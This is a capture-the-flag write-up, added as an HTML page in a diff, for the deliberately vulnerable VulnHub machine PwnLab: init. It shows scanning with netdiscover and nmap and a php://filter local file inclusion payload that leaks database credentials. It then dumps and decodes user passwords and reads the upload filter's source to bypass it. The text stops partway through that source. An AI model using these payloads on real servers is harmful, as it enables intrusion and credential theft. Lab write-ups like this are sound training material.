@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>#PwnLab: init</strong></h1>
+        <a href="https://www.vulnhub.com/entry/pwnlab-init,158/">https://www.vulnhub.com/entry/pwnlab-init,158/</a><br>
+        <br>
+        This machine isn't easy, ignore the description by the creator.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>0) Find the VM's IP</strong></h3><br>
+        To find your VM's IP address, set your VM to ‘bridged’ so that it gets assigned an IP on your internal network and then use netdiscover to scan your network: <code>netdiscover -r &lt;internal network&gt;/24</code><br>
+        <br>
+        <code>netdiscover -r 192.168.1.1/24</code><br>
+        192.168.1.184 is my init box.<br>
+        Take a snapshot of the VM at this point, just to be safe.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 192.168.1.184</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>pwnlabInit#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>initial.txt&nbsp;192.168.1.158<br>
+                Starting&nbsp;Nmap&nbsp;7.70&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-04-11&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>00&nbsp;BST<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">pwnlab</span>.lan&nbsp;(192.168.1.158)<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.00068s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;997&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                80/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.10&nbsp;((Debian))<br>
+                |_http-server-header:&nbsp;Apache/2.4.10&nbsp;(Debian)<br>
+                |_http-title:&nbsp;PwnLab&nbsp;Intranet&nbsp;Image&nbsp;Hosting<br>
+                111/tcp&nbsp;&nbsp;open&nbsp;&nbsp;rpcbind&nbsp;2-4&nbsp;(RPC&nbsp;#100000)<br>
+                |&nbsp;rpcinfo:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;program&nbsp;version&nbsp;&nbsp;&nbsp;port/proto&nbsp;&nbsp;service<br>
+                |&nbsp;&nbsp;&nbsp;100000&nbsp;&nbsp;2,3,4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;111/tcp&nbsp;&nbsp;rpcbind<br>
+                |&nbsp;&nbsp;&nbsp;100000&nbsp;&nbsp;2,3,4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;111/udp&nbsp;&nbsp;rpcbind<br>
+                |&nbsp;&nbsp;&nbsp;100024&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;39426/tcp&nbsp;&nbsp;status<br>
+                |_&nbsp;&nbsp;100024&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;59735/udp&nbsp;&nbsp;status<br>
+                3306/tcp&nbsp;open&nbsp;&nbsp;mysql&nbsp;&nbsp;&nbsp;MySQL&nbsp;5.5.47-0+deb8u1<br>
+                |&nbsp;mysql-info:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;Protocol:&nbsp;10<br>
+                |&nbsp;&nbsp;&nbsp;Version:&nbsp;5.5.47-0+deb8u1<br>
+                |&nbsp;&nbsp;&nbsp;Thread&nbsp;ID:&nbsp;38<br>
+                |&nbsp;&nbsp;&nbsp;Capabilities&nbsp;flags:&nbsp;63487<br>
+                |&nbsp;&nbsp;&nbsp;Some&nbsp;Capabilities:&nbsp;Speaks41ProtocolOld,&nbsp;Support41Auth,&nbsp;Speaks41ProtocolNew,&nbsp;DontAllowDatabaseTableColumn,&nbsp;LongColumnFlag,&nbsp;SupportsTransactions,&nbsp;InteractiveClient,&nbsp;FoundRows,&nbsp;ODBCClient,&nbsp;LongPassword,&nbsp;ConnectWithDatabase,&nbsp;IgnoreSigpipes,&nbsp;SupportsLoadDataLocal,&nbsp;IgnoreSpaceBeforeParenthesis,&nbsp;SupportsCompression,&nbsp;SupportsMultipleResults,&nbsp;SupportsAuthPlugins,&nbsp;SupportsMultipleStatments<br>
+                |&nbsp;&nbsp;&nbsp;Status:&nbsp;Autocommit<br>
+                |&nbsp;&nbsp;&nbsp;Salt:&nbsp;5#K4am}MJjY^LABg^$7%<br>
+                |_&nbsp;&nbsp;Auth&nbsp;Plugin&nbsp;Name:&nbsp;88<br>
+                MAC&nbsp;Address:&nbsp;00:0C:29:F6:60:21&nbsp;(VMware)<br>
+                Device&nbsp;type:&nbsp;general&nbsp;purpose<br>
+                Running:&nbsp;Linux&nbsp;3.X|4.X<br>
+                OS&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel:3&nbsp;cpe:/o:linux:linux_kernel:4<br>
+                OS&nbsp;details:&nbsp;Linux&nbsp;3.2&nbsp;-&nbsp;4.9<br>
+                Network&nbsp;Distance:&nbsp;1&nbsp;hop<br>
+                <br>
+                OS&nbsp;and&nbsp;Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.<br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;8.39&nbsp;seconds
+            </div>
+        </div><br>
+        <br>
+        80/http, with a title of <em>PwnLab Intranet Image Hosting</em>, is interesting.<br>
+        3306/mysql we should note down for later.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) base64 LFI</strong></h2><br>
+        The two scans I found worth doing were nikto and skipfish.<br>
+        Nikto found <code>/config.php</code> whilst skipfish found a local file inclusion vuln.<br>
+        <br>
+        <code>http://192.168.1.158/?page=./config.php</code> - but testing it out, this doesn't produce anything.<br>
+        I don't think there's any way you're supposed to know what to do here apart from trial and error of local file inclusion vulns.<br>
+        This fellow helped.<br>
+        <a href="https://highon.coffee/blog/lfi-cheat-sheet/">https://highon.coffee/blog/lfi-cheat-sheet/</a><br>
+        <br>
+        What we need is the PHP wrapper <code>php://filter:</code><br>
+        <code>.php</code> files, when accessed via local file inclusion, execute rather than printing out their contents to the screen. To circumvent this, you can base64 encode the .php file to prevent it from executing.<br>
+        <br>
+        <a href="http://192.168.1.158/?page=php://filter/convert.base64-encode/resource=config">http://192.168.1.158/?page=php://filter/convert.base64-encode/resource=config</a><br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>pwnlabInit<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8"</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;base64&nbsp;-d<br>
+                &lt;?php<br>
+                <span style="color:#7f0044;font-weight:400">$server</span> &nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"localhost"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#7f0044;font-weight:400">$username</span>&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"root"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#7f0044;font-weight:400">$password</span>&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"H4u%QJ_H99"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#7f0044;font-weight:400">$database</span>&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"Users"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                ?base64<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;invalid&nbsp;input
+            </div>
+        </div><br>
+        <br>
+        We get back what appears to be a mysql login. Log in and get the goods.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>pwnlabInit<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;mysql&nbsp;-u&nbsp;root&nbsp;-p&nbsp;-h&nbsp;192.168.1.158<br>
+                Enter&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;H4u%QJ_H99<br>
+                Welcome&nbsp;to&nbsp;the&nbsp;MariaDB&nbsp;monitor.&nbsp;&nbsp;Commands&nbsp;end&nbsp;with&nbsp;<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;or&nbsp;<span style="color:#333333;font-weight:400">\g</span>.<br>
+                Your&nbsp;MySQL&nbsp;connection&nbsp;<span style="color:#ff9d00;font-weight:700">id</span>&nbsp;is&nbsp;762<br>
+                Server&nbsp;version<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;5.5.47-0+deb8u1&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Debian<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                Copyright&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>c<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;2000,&nbsp;2018,&nbsp;Oracle,&nbsp;MariaDB&nbsp;Corporation&nbsp;Ab&nbsp;and&nbsp;others.<br>
+                <br>
+                Type&nbsp;<span style="color:#3ad900;font-weight:400">'help;'</span>&nbsp;or&nbsp;<span style="color:#3ad900;font-weight:400">'\h'</span>&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">help</span>.&nbsp;Type&nbsp;'\c'&nbsp;to&nbsp;clear&nbsp;the&nbsp;current&nbsp;input&nbsp;statement.<br>
+                <br>
+                MySQL&nbsp;[(none)]&gt;&nbsp;show&nbsp;databases;<br>
+                +--------------------+<br>
+                |&nbsp;Database&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                +--------------------+<br>
+                |&nbsp;information_schema&nbsp;|<br>
+                |&nbsp;Users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                +--------------------+<br>
+                2&nbsp;rows&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>0.00&nbsp;sec<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                MySQL&nbsp;[<span style="color:#ff9d00;font-weight:700">(</span>none<span style="color:#ff9d00;font-weight:700">)</span>]&gt;&nbsp;use&nbsp;Users<span style="color:#ff9d00;font-weight:700">;</span><br>
+                Reading&nbsp;table&nbsp;information&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">completion</span>&nbsp;of&nbsp;table&nbsp;and&nbsp;column&nbsp;names<br>
+                You&nbsp;can&nbsp;turn&nbsp;off&nbsp;this&nbsp;feature&nbsp;to&nbsp;get&nbsp;a&nbsp;quicker&nbsp;startup&nbsp;with&nbsp;-A<br>
+                <br>
+                Database&nbsp;changed<br>
+                MySQL&nbsp;[Users]&gt;&nbsp;show&nbsp;tables;<br>
+                +-----------------+<br>
+                |&nbsp;Tables_in_Users&nbsp;|<br>
+                +-----------------+<br>
+                |&nbsp;users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                +-----------------+<br>
+                1&nbsp;row&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>0.00&nbsp;sec<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                MySQL&nbsp;[Users]&gt;&nbsp;show&nbsp;FIELDS&nbsp;from&nbsp;users<span style="color:#ff9d00;font-weight:700">;</span><br>
+                +-------+-------------+------+-----+---------+-------+<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Field&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Type&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Null&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Key&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Default&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Extra&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                +-------+-------------+------+-----+---------+-------+<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;user&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;varchar<span style="color:#ff9d00;font-weight:700">(</span>30<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;YES&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;NULL&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;pass&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;varchar<span style="color:#ff9d00;font-weight:700">(</span>30<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;YES&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;NULL&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                +-------+-------------+------+-----+---------+-------+<br>
+                2&nbsp;rows&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>0.00&nbsp;sec<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                MySQL&nbsp;[Users]&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">select</span>&nbsp;*&nbsp;from&nbsp;users<span style="color:#ff9d00;font-weight:700">;</span><br>
+                +------+------------------+<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;user&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;pass&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                +------+------------------+<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;kent&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Sld6WHVCSkpOeQ==&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;mike&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;U0lmZHNURW42SQ==&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;kane&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;aVN2NVltMkdSbw==&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                +------+------------------+<br>
+                3&nbsp;rows&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>0.00&nbsp;sec<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                MySQL&nbsp;[Users]&gt;&nbsp;
+            </div>
+        </div><br>
+        <br>
+        And base64 decode them.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>pwnlabInit<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Sld6WHVCSkpOeQ=="</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;base64&nbsp;-d<br>
+                JWzXuBJJNy<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>pwnlabInit<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"U0lmZHNURW42SQ=="</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;base64&nbsp;-d<br>
+                SIfdsTEn6I<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>pwnlabInit<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"aVN2NVltMkdSbw=="</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;base64&nbsp;-d<br>
+                iSv5Ym2GRo<br>
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) upload.php</strong></h2><br>
+        Log in (I logged in as kent) and go to /upload.php.<br>
+        Try to upload a shell and you'll get an error.<br>
+        Instead, read the /upload.php file using the local file inclusion vuln from earlier to figure out how to bypass the upload filter.<br>
+        <br>
+        <code>http://192.168.1.158/?page=php://filter/convert.base64-encode/resource=upload</code><br>
+        <br>
+        I put the base64 string into a nano file because it was so large.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>pwnlabInit<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;nano&nbsp;base64upload.txt<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>pwnlabInit<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;base64&nbsp;-d&nbsp;base64upload.txt&nbsp;<br>
+                &lt;?php<br>
+                <span style="color:#ffdd00;font-weight:400">session_start()</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(!</span>isset<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_SESSION</span>[<span style="color:#3ad900;font-weight:400">'user'</span>]<span style="color:#ff9d00;font-weight:700">))</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span>&nbsp;die<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'You&nbsp;must&nbsp;be&nbsp;log&nbsp;in.'</span><span style="color:#ff9d00;font-weight:700">);</span>&nbsp;<span style="color:#ff9d00;font-weight:700">}</span><br>
+                ?&gt;<br>
+                &lt;html&gt;<br>
+                &lt;body&gt;<br>
+                &lt;form&nbsp;action=<span style="color:#3ad900;font-weight:400">''</span>&nbsp;method=<span style="color:#3ad900;font-weight:400">'post'</span>&nbsp;enctype=<span style="color:#3ad900;font-weight:400">'multipart/form-data'</span>&gt;<br>
+                &lt;input&nbsp;type=<span style="color:#3ad900;font-weight:400">'file'</span>&nbsp;name=<span style="color:#3ad900;font-weight:400">'file'</span>&nbsp;<span style="color:#ff9d00;font-weight:700">id</span>=<span style="color:#3ad900;font-weight:400">'file'</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&gt;<br>
+                &lt;input&nbsp;type=<span style="color:#3ad900;font-weight:400">'submit'</span>&nbsp;name=<span style="color:#3ad900;font-weight:400">'submit'</span>&nbsp;value=<span style="color:#3ad900;font-weight:400">'Upload'</span><span style="color:#ff9d00;font-weight:700">/</span>&gt;<br>
+                &lt;<span style="color:#ff9d00;font-weight:700">/</span>form&gt;<br>
+                &lt;<span style="color:#ff9d00;font-weight:700">/</span>body&gt;<br>
+                &lt;<span style="color:#ff9d00;font-weight:700">/</span>html&gt;<br>
+                &lt;?php&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">if(</span>isset<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_POST</span>[<span style="color:#3ad900;font-weight:400">'submit'</span>]<span style="color:#ff9d00;font-weight:700">))</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_FILES</span>[<span style="color:#3ad900;font-weight:400">'file'</span>][<span style="color:#3ad900;font-weight:400">'error'</span>]&nbsp;&lt;=&nbsp;0<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br>
+                <span style="color:#7f0044;font-weight:400">$filename</span>&nbsp;&nbsp;=&nbsp;<span style="color:#7f0044;font-weight:400">$_FILES</span>[<span style="color:#3ad900;font-weight:400">'file'</span>][<span style="color:#3ad900;font-weight:400">'name'</span>]<span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#7f0044;font-weight:400">$filetype</span>&nbsp;&nbsp;=&nbsp;<span style="color:#7f0044;font-weight:400">$_FILES</span>[<span style="color:#3ad900;font-weight:400">'file'</span>][<span style="color:#3ad900;font-weight:400">'type'</span>]<span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#7f0044;font-weight:400">$uploaddir</span>&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'upload/'</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#7f0044;font-weight:400">$file_ext</span>&nbsp;&nbsp;=&nbsp;strrchr<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$filename</span>,&nbsp;<span style="color:#3ad900;font-weight:400">'.'</span><span style="color:#ff9d00;font-weight:700">);</span><br>
+                <span style="color:#7f0044;font-weight:400">$imageinfo</span>&nbsp;=&nbsp;getimagesize<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_FILES</span>[<span style="color:#3ad900;font-weight:400">'file'</span>][<span style="color:#3ad900;font-weight:400">'tmp_name'</span>]<span style="color:#ff9d00;font-weight:700">);</span><br>
+                <span style="color:#7f0044;font-weight:400">$whitelist</span>&nbsp;=&nbsp;array<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">".jpg"</span>,<span style="color:#3ad900;font-weight:400">".jpeg"</span>,<span style="color:#3ad900;font-weight:400">".gif"</span>,<span style="color:#3ad900;font-weight:400">".png"</span><span style="color:#ff9d00;font-weight:700">);</span>&nbsp;<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(!(</span>in_array<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$file_ext</span>,&nbsp;<span style="color:#7f0044;font-weight:400">$whitelist</span><span style="color:#ff9d00;font-weight:700">)))</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br>
+                die<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'Not&nbsp;allowed&nbsp;extension,&nbsp;please&nbsp;upload&nbsp;images&nbsp;only.'</span><span style="color:#ff9d00;font-weight:700">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">}</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if(</span>strpos<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$filetype</span>,<span style="color:#3ad900;font-weight:400">'image'</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;===&nbsp;<span style="color:#ff9d00;font-weight:700">false)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br>
+                die<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'Error&nbsp;001'</span><span style="color:#ff9d00;font-weight:700">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">}</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if(</span><span style="color:#7f0044;font-weight:400">$imageinfo</span>[<span style="color:#3ad900;font-weight:400">'mime'</span>]&nbsp;<span style="color:#ff9d00;font-weight:700">!</span>=&nbsp;<span style="color:#3ad900;font-weight:400">'image/gif'</span>&nbsp;<span style="color:#ff9d00;font-weight:700">&amp;&amp;</span>&nbsp;<span style="color:#7f0044;font-weight:400">$imageinfo</span>[<span style="color:#3ad900;font-weight:400">'mime'</span>]&nbsp;<span style="color:#ff9d00;font-weight:700">!</span>=&nbsp;<span style="color:#3ad900;font-weight:400">'image/jpeg'</span>&nbsp;<span style="color:#ff9d00;font-weight:700">&amp;&amp;</span>&nbsp;<span style="color:#7f0044;font-weight:400">$imageinfo</span>[<span style="color:#3ad900;font-weight:400">'mime'</span>]&nbsp;<span style="color:#ff9d00;font-weight:700">!</span>=&nbsp;<span style="color:#3ad900;font-weight:400">'image/jpg'</span><span style="color:#ff9d00;font-weight:700">&amp;&amp;</span>&nbsp;<span style="color:#7f0044;font-weight:400">$imageinfo</span>[<span style="color:#3ad900;font-weight:400">'mime'</span>]&nbsp;<span style="color:#ff9d00;font-weight:700">!</span>=&nbsp;<span style="color:#3ad900;font-weight:400">'image/png'</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br>
+                die<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'Error&nbsp;002'</span><span style="color:#ff9d00;font-weight:700">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">}</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if(</span>substr_count<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$filetype</span>,&nbsp;<span style="color:#3ad900;font-weight:400">'/'</span><span style="color:#ff9d00;font-weight:700">)</span>&gt;1<span style="color:#ff9d00;font-weight:700">){</span><br>
+                die<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'Error&nbsp;003'</span><span style="color:#ff9d00;font-weight:700">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">}</span><br>
+                <br>
+                <span style="color:#7f0044;font-weight:400">$uploadfile</span>&nbsp;=&nbsp;<span style="color:#7f0044;font-weight:400">$uploaddir</span>&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;md5<span style="color:#ff9d00;font-weight:700">(basename(</span><span style="color:#7f0044;font-weight:400">$_FILES</span>[<span style="color:#3ad900;font-weight:400">'file'</span>][<span style="color:#3ad900;font-weight:400">'name'</span>]<span style="color:#ff9d00;font-weight:700">))</span>.<span style="color:#7f0044;font-weight:400">$file_ext</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <br>
